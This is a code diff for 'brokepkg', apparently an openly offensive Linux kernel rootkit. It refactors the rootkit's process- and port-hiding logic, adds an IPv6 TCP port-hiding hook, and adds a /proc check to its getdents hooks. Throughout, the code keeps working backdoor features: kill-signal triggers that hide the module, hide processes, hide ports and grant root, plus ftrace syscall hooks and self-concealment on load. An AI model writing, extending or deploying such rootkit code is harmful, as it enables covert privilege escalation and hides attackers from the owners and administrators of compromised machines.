@@ -2,8 +2,10 @@
 // backdoor header
 #include "backdoor.h"
 #include "config.h"
+#include "getdents.h"
 #include "give_root.h"
 #include "module_hide.h"
+#include "utils.h"
 
 #if LINUX_VERSION_CODE > KERNEL_VERSION(4, 16, 0)
 typedef asmlinkage long (*t_syscall)(const struct pt_regs *);
@@ -22,6 +24,7 @@ orig_getdents64_t orig_getdents64;
 orig_kill_t orig_kill;
 #endif
 static asmlinkage long (*orig_tcp4_seq_show)(struct seq_file *seq, void *v);
+static asmlinkage long (*orig_tcp6_seq_show)(struct seq_file *seq, void *v);
 static asmlinkage int (*orig_ip_rcv)(struct sk_buff *skb,
                                      struct net_device *dev,
                                      struct packet_type *pt,
@@ -30,52 +33,6 @@ static asmlinkage int (*orig_ip_rcv)(struct sk_buff *skb,
 static inline void tidy(void) {
   kfree(THIS_MODULE->sect_attrs);
   THIS_MODULE->sect_attrs = NULL;
-}
-
-char hide_pid[NAME_MAX];
-unsigned short hide_port[MAX_TCP_PORTS] = {0};
-
-void pid_hide(pid_t pid) {
-  sprintf(hide_pid, "%d", pid);
-#ifdef DEBUG
-  printk(KERN_INFO "brokepkg: hiding process with pid %d\n", pid);
-#endif
-}
-
-void port_hide(unsigned short port) {
-  size_t i;
-  for (i = 0; i < MAX_TCP_PORTS; i++) {
-    if (hide_port[i] == 0) {
-      hide_port[i] = port;
-#ifdef DEBUG
-      printk(KERN_INFO "Port %d hidden\n", port);
-#endif
-      return;
-    }
-  }
-}
-
-void port_show(unsigned short port) {
-  size_t i;
-  for (i = 0; i < MAX_TCP_PORTS; i++) {
-    if (hide_port[i] == port) {
-      hide_port[i] = 0;
-#ifdef DEBUG
-      printk(KERN_INFO "Port %d unhidden\n", port);
-#endif
-      return;
-    }
-  }
-}
-
-int port_is_hidden(unsigned short port) {
-  size_t i;
-  for (i = 0; i < MAX_TCP_PORTS; i++) {
-    if (hide_port[i] == port) {
-      return 1;  // true
-    }
-  }
-  return 0;  // false
 }
 
 #if LINUX_VERSION_CODE > KERNEL_VERSION(4, 16, 0)
@@ -95,18 +52,14 @@ asmlinkage int hook_kill(pid_t pid, int sig) {
       switch_module_hide();
       break;
     case SIGMODINVIS:
-      pid_hide(pid);
+      switch_pid_hide(pid);
       break;
     case SIGROOT:
       give_root();
       break;
     case SIGPORT:
-      if (port_is_hidden((unsigned short)pid))
-        port_show((unsigned short)pid);
-      else
-        port_hide((unsigned short)pid);
+      switch_port_hide((unsigned short)pid);
       break;
-
     default:
 #if LINUX_VERSION_CODE > KERNEL_VERSION(4, 16, 0)
       return orig_kill(pt_regs);
@@ -121,10 +74,10 @@ asmlinkage int hook_kill(pid_t pid, int sig) {
 #if LINUX_VERSION_CODE > KERNEL_VERSION(4, 16, 0)
 asmlinkage int hook_getdents64(const struct pt_regs *regs) {
 #if IS_ENABLED(CONFIG_X86) || IS_ENABLED(CONFIG_X86_64)
-  // int fd = (int)regs->di;
+  int fd = (int)regs->di;
   struct linux_dirent *dirent = (struct linux_dirent *)regs->si;
 #elif IS_ENABLED(CONFIG_ARM64)
-  // int fd = (int)regs->regs[0];
+  int fd = (int)regs->regs[0];
   struct linux_dirent *dirent = (struct linux_dirent *)regs->regs[1];
 #endif
   int ret = orig_getdents64(regs);
@@ -136,7 +89,9 @@ static asmlinkage int hook_getdents64(unsigned int fd,
 #endif
   long error;
   struct linux_dirent64 *current_dir, *dirent_ker, *previous_dir = NULL;
+  struct inode *d_inode;
   unsigned long offset = 0;
+  int isProc = 0;
 
   dirent_ker = kzalloc(ret, GFP_KERNEL);
 
@@ -145,12 +100,18 @@ static asmlinkage int hook_getdents64(unsigned int fd,
   error = copy_from_user(dirent_ker, dirent, ret);
   if (error) goto done;
 
+#if LINUX_VERSION_CODE < KERNEL_VERSION(3, 19, 0)
+  d_inode = current->files->fdt->fd[fd]->f_dentry->d_inode;
+#else
+  d_inode = current->files->fdt->fd[fd]->f_path.dentry->d_inode;
+#endif
+
+  if (d_inode->i_ino == PROC_ROOT_INO && !MAJOR(d_inode->i_rdev)) isProc = 1;
+
   while (offset < ret) {
     current_dir = (void *)dirent_ker + offset;
-
-    if (memcmp(PREFIX, current_dir->d_name, strlen(PREFIX)) == 0 ||
-        ((memcmp(hide_pid, current_dir->d_name, strlen(hide_pid)) == 0) &&
-         (strncmp(hide_pid, "", NAME_MAX) != 0))) {
+    if (CONTAIN_HIDE_SEQUENCE(current_dir->d_name) ||
+        NEED_HIDE_PROC(current_dir->d_name, isProc)) {
       if (current_dir == dirent_ker) {
         ret -= current_dir->d_reclen;
         memmove(current_dir, (void *)current_dir + current_dir->d_reclen, ret);
@@ -177,10 +138,10 @@ done:
 #if LINUX_VERSION_CODE > KERNEL_VERSION(4, 16, 0)
 asmlinkage int hook_getdents(const struct pt_regs *regs) {
 #if IS_ENABLED(CONFIG_X86) || IS_ENABLED(CONFIG_X86_64)
-  // int fd = (int)regs->di;
+  int fd = (int)regs->di;
   struct linux_dirent *dirent = (struct linux_dirent *)regs->si;
 #elif IS_ENABLED(CONFIG_ARM64)
-  // int fd = (int)regs->regs[0];
+  int fd = (int)regs->regs[0];
   struct linux_dirent *dirent = (struct linux_dirent *)regs->regs[1];
 #endif
   int ret = orig_getdents(regs);
@@ -197,9 +158,11 @@ static asmlinkage int hook_getdents(unsigned int fd,
     char d_name[];
   };
   long error;
+  int isProc = 0;
   unsigned long offset = 0;
 
   struct linux_dirent *current_dir, *dirent_ker, *previous_dir = NULL;
+  struct inode *d_inode;
 
   dirent_ker = kzalloc(ret, GFP_KERNEL);
 
@@ -208,12 +171,19 @@ static asmlinkage int hook_getdents(unsigned int fd,
   error = copy_from_user(dirent_ker, dirent, ret);
   if (error) goto done;
 
+#if LINUX_VERSION_CODE < KERNEL_VERSION(3, 19, 0)
+  d_inode = current->files->fdt->fd[fd]->f_dentry->d_inode;
+#else
+  d_inode = current->files->fdt->fd[fd]->f_path.dentry->d_inode;
+#endif
+
+  if (d_inode->i_ino == PROC_ROOT_INO && !MAJOR(d_inode->i_rdev)) isProc = 1;
+
   while (offset < ret) {
     current_dir = (void *)dirent_ker + offset;
 
-    if (memcmp(PREFIX, current_dir->d_name, strlen(PREFIX)) == 0 ||
-        ((memcmp(hide_pid, current_dir->d_name, strlen(hide_pid)) == 0) &&
-         (strncmp(hide_pid, "", NAME_MAX) != 0))) {
+    if (CONTAIN_HIDE_SEQUENCE(current_dir->d_name) ||
+        NEED_HIDE_PROC(current_dir->d_name, isProc)) {
       if (current_dir == dirent_ker) {
         ret -= current_dir->d_reclen;
         memmove(current_dir, (void *)current_dir + current_dir->d_reclen, ret);
@@ -240,13 +210,22 @@ static asmlinkage long hook_tcp4_seq_show(struct seq_file *seq, void *v) {
   struct sock *sk = v;
 
   if (sk != (struct sock *)0x1) {
-    size_t i;
-    for (i = 0; i < MAX_TCP_PORTS; i++) {
-      if (hide_port[i] == sk->sk_num) return 0;
-    }
+    if (port_is_hidden(sk->sk_num)) return 0;
   }
 
   ret = orig_tcp4_seq_show(seq, v);
+  return ret;
+}
+
+static asmlinkage long hook_tcp6_seq_show(struct seq_file *seq, void *v) {
+  long ret;
+  struct sock *sk = v;
+
+  if (sk != (struct sock *)0x1) {
+    if (port_is_hidden(sk->sk_num)) return 0;
+  }
+
+  ret = orig_tcp6_seq_show(seq, v);
   return ret;
 }
 
@@ -264,6 +243,7 @@ static struct ftrace_hook hooks[] = {
     HOOK_N("sys_getdents", hook_getdents, &orig_getdents),
     HOOK_N("sys_kill", hook_kill, &orig_kill),
     HOOK("tcp4_seq_show", hook_tcp4_seq_show, &orig_tcp4_seq_show),
+    HOOK("tcp6_seq_show", hook_tcp6_seq_show, &orig_tcp6_seq_show),
     HOOK("ip_rcv", hook_ip_rcv, &orig_ip_rcv),
 };
 
@@ -272,9 +252,8 @@ static int __init rootkit_init(void) {
   err = fh_install_hooks(hooks, ARRAY_SIZE(hooks));
   if (err) return err;
 
-#ifdef DEBUG
-  printk(KERN_INFO "brokepkg now is runing\n");
-#else
+  PR_INFO("brokepkg now is runing\n");
+#ifndef DEBUG
   module_hide();
 #endif
   tidy();
@@ -284,9 +263,7 @@ static int __init rootkit_init(void) {
 
 static void __exit rootkit_exit(void) {
   fh_remove_hooks(hooks, ARRAY_SIZE(hooks));
-#ifdef DEBUG
-  printk(KERN_INFO "brokepkg unloaded, my work has completed\n");
-#endif
+  PR_INFO("brokepkg unloaded, my work has completed\n");
 }
 
 module_init(rootkit_init);
